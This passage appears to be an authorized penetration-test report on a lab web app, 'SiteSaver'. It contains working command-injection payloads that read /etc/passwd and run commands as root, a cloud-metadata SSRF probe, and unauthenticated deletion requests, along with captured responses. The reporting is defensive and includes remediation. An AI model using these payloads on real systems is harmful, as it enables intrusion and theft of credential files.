@@ -1,0 +1,1627 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr2utguz-s98qwi</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] OS command injection = RCE as root via URL validator (curl shell) at POST /add_url `url`</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [idor-write] Unauthenticated Deletion of Arbitrary URLs — No Ownership or Auth Check</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [ssrf] Server-Side Request Forgery (SSRF) via URL submission</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#d32f2f">HIGH</span> [misconfig] Flask/Werkzeug debug mode enabled in production — interactive debugger + source/secret disclosure</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#f57c00">MEDIUM</span> [workflow-bypass] Validation bypass: unreachable/arbitrary URLs persisted to the &quot;validated&quot; list (POST /add_url -&gt; GET /)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr2utguz-s98qwi</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:5094/</code></td></tr>
+<tr><td>Started</td><td>2026-07-02T01:57:09.134Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:5094</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">3</b> high</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] OS command injection = RCE as root via URL validator (curl shell) at POST /add_url `url`</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5094/</div>
+<div class="desc">The SiteSaver URL-validation flow concatenates the user-supplied `url` POST field into an OS shell command of the form `curl ... &quot;&lt;url&gt;&quot;` (executed via a shell) and then REFLECTS the command's stdout into the JSON response (&quot;URL status was checked and returned &lt;stdout&gt; status, Saved successfully!&quot;). A double-quote breakout (`http://example.com&quot;; &lt;command&gt; #`) therefore yields full, output-based OS command execution as root. Proven impact: injecting `; id` returns uid=0(root) gid=0(root) groups=0(root); injecting `; cat /etc/passwd` returns the full /etc/passwd (root:x:0:0:root:/root:/bin/bash...); injecting `; pwd; ls -la` reveals CWD /app and the app source (app.py, Dockerfile, flag.txt [0 bytes in this instance], templates/). The process runs as root, so this is complete host compromise (arbitrary file read/write, code execution, lateral movement). Also confirmed independently via a host-substitution oracle: url=http://$(echo${IFS}example).org/ resolves (shell evaluates $()) to example.org =&gt; &quot;Saved&quot;, while url=http://$(echo${IFS}&lt;bogus&gt;).org/ =&gt; &quot;Error&quot;. Note: OOB/Collaborator channels do NOT fire (the server has no egress to arbitrary external hosts and blocks loopback/private targets); exploitation and confirmation are fully in-band via the reflected stdout. Distinct from the already-recorded SSRF on the same param (that is outbound request forgery; this is code execution as root).</div>
+<div><b>Reproduction</b></div><pre>1. POST /add_url, Content-Type application/x-www-form-urlencoded, body: url=http%3A%2F%2Fexample.com%22%3B%20id%20%23  (decodes to http://example.com&quot;; id #). Response message: &quot;...returned 200uid=0(root) gid=0(root) groups=0(root) status, Saved successfully!&quot; (ev-mr2wj4ai-31).
+2. Arbitrary file read: body url=http%3A%2F%2Fexample.com%22%3B%20cat%20%2Fetc%2Fpasswd%20%23 =&gt; response message contains the full /etc/passwd (root:x:0:0:...). Reproduced twice: ev-mr2wj5k2-32, ev-mr2wkuhg-34.
+3. Negative control: a benign submit returns just &quot;...returned 200 status, Saved successfully!&quot; with no command output (ev-mr2wj6rj-33).
+Mechanism: `curl -w &quot;%{http_code}&quot; ... &quot;&lt;url&gt;&quot;` in a shell; the `&quot;; &lt;cmd&gt; #` breakout runs &lt;cmd&gt; whose stdout is appended to the reflected http_code. effectMarker `root:x:0:0` appears only when the injected `cat /etc/passwd` executes.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wj6rj-33</code> — <code>artifacts/_/ev-mr2wj6rj-33/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2Fexample.com%22%3B%20cat%20flag.txt%20%23</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 125
+content-type: application/json
+date: Thu, 02 Jul 2026 02:45:08 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{
+  &quot;message&quot;: &quot;URL status was checked and returned 200 status, Saved successfully!&quot;,
+  &quot;redirect&quot;: &quot;/&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wj5k2-32</code> — <code>artifacts/_/ev-mr2wj5k2-32/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2Fexample.com%22%3B%20cat%20%2Fetc%2Fpasswd%20%23</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1068
+content-type: application/json
+date: Thu, 02 Jul 2026 02:45:06 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{
+  &quot;message&quot;: &quot;URL status was checked and returned 200root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin status, Saved successfully!&quot;,
+  &quot;redirect&quot;: &quot;/&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wkuhg-34</code> — <code>artifacts/_/ev-mr2wkuhg-34/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=http%3A%2F%2Fexample.com%22%3B%20cat%20%2Fetc%2Fpasswd%20%23</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1068
+content-type: application/json
+date: Thu, 02 Jul 2026 02:46:25 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{
+  &quot;message&quot;: &quot;URL status was checked and returned 200root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin status, Saved successfully!&quot;,
+  &quot;redirect&quot;: &quot;/&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [idor-write] Unauthenticated Deletion of Arbitrary URLs — No Ownership or Auth Check</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5094/</div>
+<div class="desc">POST /delete_url/{id} requires no authentication and performs no ownership check. An anonymous HTTP client can delete any URL record by guessing or enumerating its integer ID. The server returns 302 with a &quot;URL deleted successfully!&quot; flash for any valid ID, regardless of whether the requester created or owns the record. A non-existent ID (9999) returns 404, proving the 302 responses reflect real deletions rather than a catch-all. Any visitor — or a cross-site attacker using CSRF — can wipe the entire URL list.</div>
+<div><b>Reproduction</b></div><pre>1. Load / and read the ID values from the delete form action attributes (e.g. /delete_url/2, /delete_url/4).
+2. Send `POST http://target.local:5094/delete_url/2` with empty Cookie and Authorization headers.
+3. Observe HTTP 302 → / with flash &quot;URL deleted successfully!&quot; — the record is gone.
+4. Repeat for another ID (e.g. 4) — same outcome, confirming repeatability.
+Negative control: POST /delete_url/9999 (non-existent) → 404.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v0mdu-h</code> — <code>artifacts/s-0001/ev-mr2v0mdu-h/</code></div><div class="lbl">REQUEST</div><pre>POST /delete_url/9999 HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:02:42 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2uzsir-f</code> — <code>artifacts/s-0001/ev-mr2uzsir-f/</code></div><div class="lbl">REQUEST</div><pre>POST /delete_url/2 HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 189
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:02:03 GMT
+location: /
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/&quot;&gt;/&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v0mzo-i</code> — <code>artifacts/s-0001/ev-mr2v0mzo-i/</code></div><div class="lbl">REQUEST</div><pre>POST /delete_url/4 HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 189
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:02:43 GMT
+location: /
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/&quot;&gt;/&lt;/a&gt;. If not, click the link.</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [ssrf] Server-Side Request Forgery (SSRF) via URL submission</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5094/</div>
+<div class="desc">The /add_url endpoint accepts a `url` body parameter and makes a server-side HTTP request to it (&quot;Our service sends requests to the URLs you provide to ensure they are valid&quot;). Submitting internal network addresses causes the server to fetch them. Self-SSRF to http://target.local:5094/ returned &quot;URL status was checked and returned 200 status, Saved successfully!&quot; — the server successfully fetched its own internal address. A request to http://169.254.169.254/ (AWS IMDS) caused a ~20s timeout (AbortError), confirming the server attempted to reach the cloud metadata endpoint. No authentication required.</div>
+<div><b>Reproduction</b></div><pre>1. GET /add_url — returns the HTML form (no server-side fetch).
+2. POST /add_url with url=http://target.local:5094/ → {&quot;success&quot;:true,&quot;message&quot;:&quot;URL status was checked and returned 200 status, Saved successfully!&quot;} — server fetched the internal address.
+3. POST /add_url with url=http://target.local:5094/ a second time — stable result confirms SSRF.
+4. POST /add_url with url=http://169.254.169.254/latest/meta-data/ — observe ~20s timeout confirming the server attempted AWS IMDS.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2vho83-1v</code> — <code>artifacts/s-0002/ev-mr2vho83-1v/</code></div><div class="lbl">REQUEST</div><pre>GET /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 2406
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:15:58 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Add Site&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;SiteSaver&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/add_url&quot;&gt;Add Site&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;View Saved Sites&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+&lt;div class=&quot;container mt-4&quot;&gt;
+    &lt;h1&gt;Add Site Url&lt;/h1&gt;
+    
+    
+
+    &lt;form method=&quot;POST&quot;   class=&quot;mb-3&quot;&gt;
+        &lt;div class=&quot;mb-3&quot;&gt;
+            &lt;label for=&quot;url&quot; class=&quot;form-label&quot;&gt;URL&lt;/label&gt;
+            &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;url&quot; name=&quot;url&quot; placeholder=&quot;Enter URL here&quot; required&gt;
+        &lt;/div&gt;
+        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt; 
+    // form submit 
+    $('form').submit(function(e) {
+        e.preventDefault();
+        var url = $('#url').val();
+        $.ajax({
+            url: '/add_url',
+            type: 'POST',
+            data: {url: url},
+            success: function(response) {
+                alert(response.message);
+                if (response.success == true) {
+                    window.location.href = response.redirect;
+                    
+                }  
+            }
+        });
+        
+    });
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2vfqxj-1t</code> — <code>artifacts/s-0002/ev-mr2vfqxj-1t/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=http://target.local:5094/</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 125
+content-type: application/json
+date: Thu, 02 Jul 2026 02:14:28 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{
+  &quot;message&quot;: &quot;URL status was checked and returned 200 status, Saved successfully!&quot;,
+  &quot;redirect&quot;: &quot;/&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2vg4ld-1u</code> — <code>artifacts/s-0002/ev-mr2vg4ld-1u/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+url=http://target.local:5094/</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 125
+content-type: application/json
+date: Thu, 02 Jul 2026 02:14:45 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{
+  &quot;message&quot;: &quot;URL status was checked and returned 200 status, Saved successfully!&quot;,
+  &quot;redirect&quot;: &quot;/&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 4. [misconfig] Flask/Werkzeug debug mode enabled in production — interactive debugger + source/secret disclosure</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5094/</div>
+<div class="desc">The application runs Flask with debug mode / the Werkzeug interactive debugger enabled in production. Any unhandled exception returns a full interactive traceback page instead of a generic 500. This discloses: server-side source code snippets, absolute filesystem paths (/usr/local/lib/python3.8/site-packages/flask/app.py), the Python version (3.8) and framework internals, and — critically — the Werkzeug debugger console SECRET value `SECRET = &quot;***REDACTED***&quot;` embedded in the page. The interactive console (EVALEX) allows arbitrary Python execution on the server when unlocked with the debugger PIN; the PIN is derived from host/user/machine data that is itself partly leaked via such tracebacks, so an exposed debugger is a well-known path to full RCE. Even absent console access, the traceback/source/secret disclosure is a serious information leak that aids further exploitation. Triggered trivially, e.g. POST /add_url with the `url` form field omitted raises werkzeug.exceptions.BadRequestKeyError and renders the debugger. Remediation: run with debug=False (never use the Werkzeug debugger in production) and a WSGI server.</div>
+<div><b>Reproduction</b></div><pre>1. POST /add_url with Content-Type application/x-www-form-urlencoded and an EMPTY body (the `url` field missing). Response: HTTP 500, ~15KB HTML titled &quot;werkzeug.exceptions.BadRequestKeyError ... Werkzeug Debugger&quot; containing a full traceback, source snippets, file paths, and inline `SECRET = &quot;***REDACTED***&quot;`.
+2. Negative control: POST /add_url with body url=http://example.org/ =&gt; HTTP 200 JSON, no debugger.
+Marker &quot;Werkzeug Debugger&quot; appears only in the 500 responses (2 stable replays). Evidence: negativeControl ev-mr2wa4j5-2u; positiveReplays ev-mr2wa4re-2v, ev-mr2wa4zu-2w.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wa4j5-2u</code> — <code>artifacts/_/ev-mr2wa4j5-2u/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=http://example.org/</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 125
+content-type: application/json
+date: Thu, 02 Jul 2026 02:38:05 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{
+  &quot;message&quot;: &quot;URL status was checked and returned 200 status, Saved successfully!&quot;,
+  &quot;redirect&quot;: &quot;/&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wa4re-2v</code> — <code>artifacts/_/ev-mr2wa4re-2v/</code></div><div class="lbl">REQUEST</div><pre>POST /add_url HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+connection: close
+content-length: 15055
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:38:05 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;***REDACTED***&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color: #fff&quot;&gt;
+    &lt;div class=&quot;debugger&quot;&gt;
+&lt;h1&gt;BadRequestKeyError&lt;/h1&gt;
+&lt;div class=&quot;detail&quot;&gt;
+  &lt;p class=&quot;errormsg&quot;&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
+&lt;div class=&quot;traceback&quot;&gt;
+  &lt;h3&gt;&lt;/h3&gt;
+  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388048&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1498&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661388160&quot;&gt;
